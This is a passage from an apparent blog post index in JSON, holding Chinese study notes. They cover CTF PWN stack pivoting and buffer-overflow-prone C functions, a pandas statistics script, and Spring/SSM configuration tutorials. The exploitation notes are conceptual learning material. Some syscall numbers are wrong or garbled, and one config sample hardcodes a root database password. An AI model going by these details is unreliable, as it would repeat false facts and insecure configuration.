伪造的栈让程序直接跳转到伪造的栈里面,然后为了保持栈平衡,从而执行 leave ;ret,最后继续执行伪造栈内的payload 5.过程 使用输入函数(如read),将后续的payload加载到bss段内,也就是伪造的栈 通过 pop ebp;ret | pop ebx;ret 来调整EBP寄存器 通过 leave ret; 来更改 ESP,使其指向伪造的栈 然后在伪造的栈中执行下一段ROP","categories":[],"tags":[{"name":"PWN CTF","slug":"PWN-CTF","permalink":"http://yoursite.com/tags/PWN-CTF/"}]},{"title":"PWN-常见危险函数","slug":"PWN-常见危险函数","date":"2020-12-12T04:19:32.000Z","updated":"2020-12-12T04:25:50.279Z","comments":true,"path":"2020/12/12/PWN-常见危险函数/","link":"","permalink":"http://yoursite.com/2020/12/12/PWN-常见危险函数/","excerpt":"","text":"CTF-PWN常见的危险函数 gets() 没有检查边界 通过计算函数的偏移量,通过构造payload达到溢出 fgets(buf, 40, stdin) 能够接受39Byte,最后一个字节为NULL 如果buf的长度没有39也可以造成溢出 read(stdin, buf, 40) 从输入中读取40个Byte,到buf,最后的字节可以不是NULL 可能会造成信息的泄漏 read(0,buf,0x20) 从用户输入读取32个字符 Write(int fd, buf, nbytes) fd 输出描述 1 buf 为要写入到数据的缓冲区地址 nbytes为要写入的数据的字节数 strcpy memcpy scanf（“%s”，buff） syscall系统调用 操作系统实现系统调用的基本过程是: 应用程序调用库函数(API) API将系统调用号存入EAX,然后通过中断调用使系统进入内核态 内核中终端处理函数根据系统调用号,调用对应的内核函数(系统调用) 系统调用完成相应的功能,将返回值存入EAX,返回到中断处理函数 中断处理函数返回到API中 API将EAX返回给应用程序 应用程序调用系统调用的过程 把系统调用的编号存入EAX 把函数参数存入其他通用寄存器 触发0x80号中断(int 0x80) 以上是32位的系统调用,与64 位的区别是 传参方式不同 32位 先将系统调用号传入eax,然后将参数从左到右依次存入ebx,ecx,edx寄存器中,返回值存在eax中 64位 先将系统调用号传入rax,然后传参数 从左到右依次存入rdi,rsi,rdx寄存器中,返回值存在rax寄存器 系统调用号不同 32位 sys_read 的系统调用号为 30 sys_write 的系统调用号为4 64位 sys_read的调用号位0,sys_write的调用号为1亿 调用方式不同 ​ 32位 使用int 80 中断进行系统调用 64位 使用syscall进行系统调用","categories":[],"tags":[{"name":"PWN CTF","slug":"PWN-CTF","permalink":"http://yoursite.com/tags/PWN-CTF/"}]},{"title":"东南大学无锡分校青年大学习统计","slug":"东南大学青年大学习统计","date":"2020-10-21T07:06:45.000Z","updated":"2020-10-21T07:23:22.461Z","comments":true,"path":"2020/10/21/东南大学青年大学习统计/","link":"","permalink":"http://yoursite.com/2020/10/21/东南大学青年大学习统计/","excerpt":"","text":"东南大学青年大学习统计运行截图 环境安装 你可以按照下面的方式下载代码到本地 1git clone --depth 1 https://github.com/huzai9527/studyAnalysis.git SUSmember-dev 本项目在python 3 下运行,并且依赖pands,你可以在终端运行以下命令进行安装 1pip install pandas 所需要的文件以及格式 本院总名单,按照如下格式,首行为班级名称,首列为索引号(excel自带),将班级同学名字替换即可 班级累计分数:首行为列名第一列列名空,第二列列名累计分数 第一列为填班级名,第二列为保存的班级名 最后是大学习的统计情况,此文件是上级下发的,只要移到此目录即可 注: 总名单以及班级累计分数可以在下载好的文件中直接修改 安装好环境以及准备好相应文件后,在终端运行(文件目录路径下)1python SUSmember.py 无锡分校-东南-第十一期 运行完成输出，各班详细情况，并在结果文件夹生成EXCELL统计文件 有不是团员的只要在总名单中删除即可","categories":[],"tags":[{"name":"数据分析","slug":"数据分析","permalink":"http://yoursite.com/tags/数据分析/"}]},{"title":"SSM框架整合","slug":"SSM框架整合","date":"2020-10-16T21:15:57.000Z","updated":"2020-10-16T21:16:11.964Z","comments":true,"path":"2020/10/17/SSM框架整合/","link":"","permalink":"http://yoursite.com/2020/10/17/SSM框架整合/","excerpt":"","text":"SSM框架整合导入相关的依赖 pom.xml 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;org.example&lt;/groupId&gt; &lt;artifactId&gt;ssmBuild&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt;&lt;!-- mybatis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.5.5&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt; &lt;version&gt;2.0.5&lt;/version&gt; &lt;/dependency&gt;&lt;!-- 数据库驱动--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.49&lt;/version&gt; &lt;/dependency&gt;&lt;!-- 数据库连接池--&gt; &lt;dependency&gt; &lt;groupId&gt;com.mchange&lt;/groupId&gt; &lt;artifactId&gt;c3p0&lt;/artifactId&gt; &lt;version&gt;0.9.5.5&lt;/version&gt; &lt;/dependency&gt;&lt;!-- spring--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;5.2.0.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt; &lt;version&gt;5.2.0.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;/groupId&gt; &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt; &lt;version&gt;1.9.6&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;version&gt;1.18.12&lt;/version&gt; &lt;/dependency&gt;&lt;!-- junit--&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.13&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/java&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.properties&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;resource&gt; &lt;directory&gt;src/main/resource&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.properties&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;/build&gt;&lt;/project&gt; 整合mybatis db.properties 1234jdbc.driver=com.mysql.jdbc.Driverjdbc.username=rootjdbc.password=asdqwe123.jdbc.url=jdbc:mysql://localhost:3306/ssmbuild?useUnicode=true&amp;characterEncoding=utf8 Mybatis-config.xml 123456789101112131415&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;&lt;!DOCTYPE configuration PUBLIC \"-//mybatis.org//DTD Config 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-config.dtd\"&gt;&lt;configuration&gt;&lt;!--配置数据源，spring代理了--&gt;&lt;!-- 配置别名--&gt; &lt;typeAliases&gt; &lt;package name=\"com.huzai.pojo\"/&gt; &lt;/typeAliases&gt;&lt;!-- mapper扫描--&gt; &lt;mappers&gt; &lt;package name=\"com.huzai.dao\"/&gt; &lt;/mappers&gt;&lt;/configuration&gt; Spring-dao.xml 12345678910111213141516171819202122232425262728293031323334353637&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd\"&gt;&lt;!-- 关联数据库配置文件--&gt; &lt;context:property-placeholder location=\"classpath:db.properties\"/&gt;&lt;!-- 连接池--&gt; &lt;bean id=\"dataSource\" class=\"com.mchange.v2.c3p0.ComboPooledDataSource\"&gt; &lt;property name=\"driverClass\" value=\"$&#123;jdbc.driver&#125;\"/&gt; &lt;property name=\"user\" value=\"$&#123;jdbc.username&#125;\"/&gt; &lt;property name=\"password\" value=\"$&#123;jdbc.password&#125;\"/&gt; &lt;property name=\"jdbcUrl\" value=\"$&#123;jdbc.url&#125;\"/&gt; &lt;property name=\"maxPoolSize\" value=\"30\"/&gt; &lt;property name=\"minPoolSize\" value=\"10\"/&gt; &lt;property name=\"checkoutTimeout\" value=\"10000\"/&gt; &lt;property name=\"autoCommitOnClose\" value=\"false\"/&gt; &lt;property name=\"acquireRetryAttempts\" value=\"2\"/&gt; &lt;/bean&gt;&lt;!-- sqlSessionFactory--&gt; &lt;bean id=\"sqlSessionFactory\" class=\"org.mybatis.spring.SqlSessionFactoryBean\"&gt; &lt;property name=\"dataSource\" ref=\"dataSource\"/&gt;&lt;!-- 绑定mybatis配置文件--&gt; &lt;property name=\"configLocation\" value=\"classpath:mybatis-config.xml\"/&gt; &lt;/bean&gt;&lt;!-- 配置dao接口扫描包，动态实现dao接口注入spring容器中--&gt; &lt;bean id=\"mapperScannerConfigurer\" class=\"org.mybatis.spring.mapper.MapperScannerConfigurer\"&gt;&lt;!-- 注入sqlSessionFactory--&gt; &lt;property name=\"sqlSessionFactoryBeanName\" value=\"sqlSessionFactory\"/&gt;&lt;!-- 需要扫描的dao包--&gt; &lt;property name=\"basePackage\" value=\"com.huzai.dao\"/&gt; &lt;/bean&gt;&lt;/beans&gt; 整合spring spring-service.xml 123456789101112131415161718192021&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd\"&gt;&lt;!-- 要扫描的service下的包--&gt; &lt;context:component-scan base-package=\"com.huzai.service\"/&gt;&lt;!-- 将所有的业务类，注入到spring容器中，可以配置实现，也可以注解实现--&gt;&lt;!-- &lt;bean id=\"bookServiceImpl\" class=\"com.huzai.service.bookServiceImpl\"&gt;--&gt;&lt;!-- &lt;property name=\"bookMapper\" ref=\"bookMapper\"/&gt;--&gt;&lt;!-- &lt;/bean&gt;--&gt;&lt;!-- 声明事物配置--&gt; &lt;bean id=\"dataSourceTransactionManager\" class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\"&gt; &lt;!-- 注入数据源--&gt; &lt;property name=\"dataSource\" ref=\"dataSource\"/&gt; &lt;/bean&gt;&lt;!-- aop事物支持--&gt;&lt;/beans&gt; 整合spring-mvc spring-mvc.xml 1234567891011121314151617181920212223&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:p=\"http://www.springframework.org/schema/p\" xmlns:context=\"http://www.springframework.org/schema/context\" xmlns:mvc=\"http://www.springframework.org/schema/mvc\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd\"&gt;&lt;!-- 注解驱动--&gt; &lt;mvc:annotation-driven/&gt;&lt;!-- 静态资源过滤--&gt; &lt;mvc:default-servlet-handler/&gt;&lt;!-- 扫描包--&gt; &lt;context:component-scan base-package=\"com.huzai.controller\"/&gt;&lt;!-- 试图解析器--&gt; &lt;bean id=\"internalResourceViewResolver\" class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\"&gt; &lt;property name=\"prefix\" value=\"/WEB-INF/jsp/\"/&gt; &lt;property name=\"suffix\" value=\".jsp\"/&gt; &lt;/bean&gt;&lt;/beans&gt; applicationContext.xml 123456789101112&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd\"&gt; &lt;import resource=\"classpath:spring-service.xml\"/&gt; &lt;import resource=\"classpath:spring-dao.xml\"/&gt; &lt;import resource=\"classpath:spring-mvc.xml\"/&gt;&lt;/beans&gt; web.xml 1234567891011121314151617181920212223242526272829303132333435&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version=\"4.0\"&gt;&lt;!-- DispatcherServlet--&gt; &lt;servlet&gt; &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:applicationContext&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;&lt;!-- 乱码过滤--&gt; &lt;filter&gt; &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt; &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt;&lt;!-- session--&gt; &lt;session-config&gt; &lt;session-timeout&gt;12&lt;/session-timeout&gt; &lt;/session-config&gt;&lt;/web-app&gt;","categories":[],"tags":[]},{"title":"SpringMVC学习总结","slug":"SpringMVC学习总结","date":"2020-10-16T21:15:18.000Z","updated":"2020-10-16T21:15:37.691Z","comments":true,"path":"2020/10/17/SpringMVC学习总结/","link":"","permalink":"http://yoursite.com/2020/10/17/SpringMVC学习总结/","excerpt":"","text":"SprngMVC学习总结HelloSpringMvc遇到的问题 Tomcat中没有相应的jar包,需要导入! controller在注册时的id,就是url中的参数,需要保持一致 使用注解进行开发123456&lt;!-- 自动扫描包，让指定包下的注解生效--&gt; &lt;context:component-scan base-package=\"com.huzai.controller\"/&gt;&lt;!-- 让SpringMVC不处理静态资源--&gt; &lt;mvc:default-servlet-handler/&gt;&lt;!-- 自动注入--&gt; &lt;mvc:annotation-driven/&gt; RestFull风格url路径中参数的携带123456@RequestMapping(value = \"/add/&#123;a&#125;/&#123;b&#125;\", method = RequestMethod.GET)public String add(@PathVariable int a,@PathVariable int b, Model model)&#123; int result = a+b; model.addAttribute(\"msg\",result); return \"hello\";&#125; JSON的使用jackson 依赖(需要将其jar包导入tomcat的依赖) 12345&lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.11.3&lt;/version&gt;&lt;/dependency&gt; 使用(可以在大环境下使用@RestController) 12345678@RequestMapping(\"/json\")@ResponseBodypublic String json() throws JsonProcessingException &#123; ObjectMapper objectMapper = new ObjectMapper(); Date date = new Date(); String str = objectMapper.writeValueAsString(date); return str;&#125; fastjson 依赖 12345&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.73&lt;/version&gt; &lt;/dependency&gt; 使用 1234567891011 @RequestMapping(\"/fastJson\") @ResponseBody public String fastJson()&#123;// fastJson 有很多功能其实都可以用jackson扩展写// java对象转JSON字符串JSON.toJSONString// JSON字符串转JAVA对象JSON.parseObject() Date date = new Date(); String json = JSON.toJSONString(date); return json; &#125; 乱码问题Web中的乱码 在web.xml中进行配置 12345678&lt;filter&gt; &lt;filter-name&gt;encoding&lt;/filter-name&gt; &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;encoding&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt; Jackson中的乱码 在springMVC的配置文件中进行配置 12345678910111213&lt;!-- 自动注入,JSON乱码问题配置--&gt;&lt;mvc:annotation-driven&gt; &lt;mvc:message-converters register-defaults=\"true\"&gt; &lt;bean class=\"org.springframework.http.converter.xml.SourceHttpMessageConverter\"/&gt; &lt;bean class=\"org.springframework.http.converter.cbor.MappingJackson2CborHttpMessageConverter\"&gt; &lt;property name=\"objectMapper\"&gt; &lt;bean class=\"org.springframework.http.converter.json.Jackson2ObjectMapperFactoryBean\"&gt; &lt;property name=\"failOnEmptyBeans\" value=\"false\"/&gt; &lt;/bean&gt; &lt;/property&gt; &lt;/bean&gt; &lt;/mvc:message-converters&gt;&lt;/mvc:annotation-driven&gt; fastjson中的乱码1234567891011&lt;mvc:annotation-driven&gt; &lt;mvc:message-converters&gt; &lt;bean class=\"org.springframework.http.converter.StringHttpMessageConverter\"&gt; &lt;property name=\"supportedMediaTypes\"&gt; &lt;list&gt; &lt;value&gt;application/json;charset=UTF-8&lt;/value&gt; &lt;/list&gt; &lt;/property&gt; &lt;/bean&gt; &lt;/mvc:message-converters&gt;&lt;/mvc:annotation-driven&gt; springMVC中的全部配置文件web.xml12345678910111213141516171819202122232425262728293031&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version=\"4.0\"&gt; &lt;servlet&gt; &lt;servlet-name&gt;springMVC&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:springmvc-servlet.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;springMVC&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;filter&gt; &lt;filter-name&gt;encoding&lt;/filter-name&gt; &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;encoding&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt;&lt;/web-app&gt; Springmvc-servlet.xml123456789101112131415161718192021222324252627282930313233&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:p=\"http://www.springframework.org/schema/p\" xmlns:context=\"http://www.springframework.org/schema/context\" xmlns:mvc=\"http://www.springframework.org/schema/mvc\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd\"&gt; &lt;!-- 自动扫描包，让指定包下的注解生效--&gt; &lt;context:component-scan base-package=\"com.huzai.controller\"/&gt; &lt;!-- 让SpringMVC不处理静态资源--&gt; &lt;mvc:default-servlet-handler/&gt; &lt;!-- 自动注入,JSON乱码问题配置--&gt; &lt;mvc:annotation-driven&gt; &lt;mvc:message-converters register-defaults=\"true\"&gt; &lt;bean class=\"org.springframework.http.converter.xml.SourceHttpMessageConverter\"/&gt; &lt;bean class=\"org.springframework.http.converter.cbor.MappingJackson2CborHttpMessageConverter\"&gt; &lt;property name=\"objectMapper\"&gt; &lt;bean class=\"org.springframework.http.converter.json.Jackson2ObjectMapperFactoryBean\"&gt; &lt;property name=\"failOnEmptyBeans\" value=\"false\"/&gt; &lt;/bean&gt; &lt;/property&gt; &lt;/bean&gt; &lt;/mvc:message-converters&gt; &lt;/mvc:annotation-driven&gt; &lt;bean class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\" id=\"internalResourceViewResolver\"&gt; &lt;property name=\"prefix\" value=\"/WEB-INF/jsp/\"/&gt; &lt;property name=\"suffix\" value=\".jsp\"/&gt; &lt;/bean&gt;&lt;/beans&gt;","categories":[],"tags":[]},{"title":"Spring学习总结","slug":"Spring学习总结","date":"2020-10-16T21:09:51.000Z","updated":"2020-10-16T21:10:02.595Z","comments":true,"path":"2020/10/17/Spring学习总结/","link":"","permalink":"http://yoursite.com/2020/10/17/Spring学习总结/","excerpt":"","text":"Spring课堂记录SpringIOC理论推导 UserDao UserDaoImpl UserService UserServiceImpl 在之前的业务中,用户的需求可能会影响我们的源代码,我们要根据用户的需求修改源代码,如果代码量非常大,修改一次的成本十分昂贵! 使用一个Set接口,利用set进行动态值的注入,会发生革命性的变化! 123public void setHello(Hello hello) &#123; this.hello = hello;&#125; 之前,是程序主动创造对象!控制权在程序员手上! 使用set注入后,程序不在具有主动性,而是变成了被动的接受对象! 这种思想,从本质上解决了问题,程序员不用再去管理对象的创建.系统的耦合性大大降低,可以使程序猿更加专注在业务的实现上!这是IOC的原型! IOC实现 An architecture for end-to-end and inter-domain trusted mail delivery service 配置 在beans.xml 中配置注册pojo类,将这些类交给spring进行管理 12345678910&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd\"&gt; &lt;!-- more bean definitions go here --&gt;&lt;/beans&gt; 使用beans 12345678// create and configure beansApplicationContext context = new ClassPathXmlApplicationContext(\"services.xml\", \"daos.xml\");// retrieve configured instancePetStoreService service = context.getBean(\"petStore\", PetStoreService.class);// use configured instanceList&lt;String&gt; userList = service.getUsernameList(); bean中的参数 id:bean的唯一标识 class:bean绑定的pojo对象 autowire:通过set方法中的属性自动装配其他的bean 依赖注入 构造器注入 set注入 依赖:bean对象的创建依赖与容器! 注入:bean对象的所有属性有容器注入! 拓展方式注入 1234567891011121314&lt;bean id=\"exampleBean\" class=\"examples.ExampleBean\"&gt; &lt;!-- constructor injection using the nested ref element --&gt; &lt;constructor-arg&gt; &lt;ref bean=\"anotherExampleBean\"/&gt; &lt;/constructor-arg&gt; &lt;!-- constructor injection using the neater ref attribute --&gt; &lt;constructor-arg ref=\"yetAnotherBean\"/&gt; &lt;constructor-arg type=\"int\" value=\"1\"/&gt;&lt;/bean&gt;&lt;bean id=\"anotherExampleBean\" class=\"examples.AnotherBean\"/&gt;&lt;bean id=\"yetAnotherBean\" class=\"examples.YetAnotherBean\"/&gt; bean的作用域 ==单例模式==(spring默认机制) :这全局唯一,永远只创建一个实例 1234&lt;bean id=\"accountService\" class=\"com.something.DefaultAccountService\"/&gt;&lt;!-- the following is equivalent, though redundant (singleton scope is the default) --&gt;&lt;bean id=\"accountService\" class=\"com.something.DefaultAccountService\" scope=\"singleton\"/&gt; 原型模式:每次都会产生一个新的对象 1&lt;bean id=\"accountService\" class=\"com.something.DefaultAccountService\" scope=\"prototype\"/&gt; #### Spring注解开发applicationContext.xml配置文件12345678910111213&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd\"&gt; &lt;context:component-scan base-package=\"com.huzai.pojo\"/&gt; &lt;context:annotation-config/&gt;&lt;/beans&gt; bean的注入包括 在pojo中直接用[@Component] 在service中使用[@Service] 在dao使用[@Repository] 在controller使用[@Controller] 值与对象的注入 [@Value(“huzai”)]对值的注入 [@Scope(“protoType”)]作用域的注入 [@Autowired] 对对象中的对象的注入 [@Qualifier(value = “dog”)] 配合@Autowired使用,指定精确的注入对象 123456@Value(\"huzai\")private String name;@Nullable@Autowired@Qualifier(value = \"dog\")private Dog dog; [@Nullable]表明字段可以为空 完全不用xml配置的注解开发 配置用config.java(相当于beans.xml) 123456789101112@Configuration@ComponentScanpublic class MyConfig &#123; //注册一个bean,相当于一个bean的标签 //方法的名字相当于bean标签中的id属性 //方法的返回值相当于bean标签中的class属性 // @Bean public User getUser()&#123; return new User(); &#125;&#125; 代理模式静态代理静态代理也就是项目横向开发的过程,在此过程中,猿们无需改变以前的代码,因为这是公司中的大忌. 角色分析 抽象角色:一般使用接口或抽象类来解决 真实角色:被代理的角色 代理角色:代理真实角色,一般有一些附属操作 客户:访问代理对象的人 代码步骤 接口 真实角色 代理角色 客户端访问 代理模式的好处 可以是真实角色的操作更加纯粹,不用关心其他公共业务 公共业务可以交给代理角色!实现了业务的分工! 公共业务发生集中在一起,方便管理 缺点 一个真实角色产生一个代理,代码量翻倍,开发效率变低 动态代理 角色与静态代理一样 代理动态生成 分为两大类 基于接口 – JDK’动态代理 基于类 – cglib 基于java字节码 – javassit 优点 除了静态代理的 一个动态代理类可以代理多个类,只要实现了对应的借口 一个动态代理类代理的是一个接借口,一般对应的是一类业务 AOP在Spring中的作用==提供声明式事物;允许用户自定义切面== Spring中实现AOP AOP依赖 12345&lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;/groupId&gt; &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt; &lt;version&gt;1.9.6&lt;/version&gt;&lt;/dependency&gt; 配置文件:applicationContext.xml 12345678910111213141516&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:aop=\"http://www.springframework.org/schema/aop\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/aop https://www.springframework.org/schema/aop/spring-aop.xsd\"&gt; &lt;context:component-scan base-package=\"com.huzai\"/&gt; &lt;context:annotation-config/&gt; &lt;aop:aspectj-autoproxy/&gt;&lt;/beans&gt; 方式 方式一:使用Spring API接口 1234&lt;aop:config&gt; &lt;aop:pointcut id=\"pointcut\" expression=\"execution(* com.huzai.service.UserServiceImpl.*(..))\"/&gt; &lt;aop:advisor advice-ref=\"log\" pointcut-ref=\"pointcut\"/&gt;&lt;/aop:config&gt; 方式二:自定义类 1234567&lt;!-- 方式二：使用自定义类--&gt; &lt;aop:config&gt; &lt;aop:aspect ref=\"diyPointCut\"&gt; &lt;aop:pointcut id=\"pointcut\" expression=\"execution(* com.huzai.service.*.*(..))\"/&gt; &lt;aop:before method=\"before\" pointcut-ref=\"pointcut\"/&gt; &lt;/aop:aspect&gt; &lt;/aop:config&gt; 方式三:使用注解开发 12345678@Component@Aspectpublic class AnnotationPoint &#123; @Before(\"execution(* com.huzai.pojo.User.* (..))\") public void before()&#123; System.out.println(\"====开始====\"); &#125;&#125; Spring整合Mybatis使用Spring 的数据源 参数包括连接数据库的所有参数 以及对数据进行约束的数据源自带的约束 一般的数据源包括 c3p0、druid、dbcp 123456&lt;bean id=\"dataSource\" class=\"org.springframework.jdbc.datasource.DriverManagerDataSource\"&gt; &lt;property name=\"driverClassName\" value=\"com.mysql.jdbc.Driver\"/&gt; &lt;property name=\"username\" value=\"root\"/&gt; &lt;property name=\"url\" value=\"jdbc:mysql://localhost:3306/mybatis? 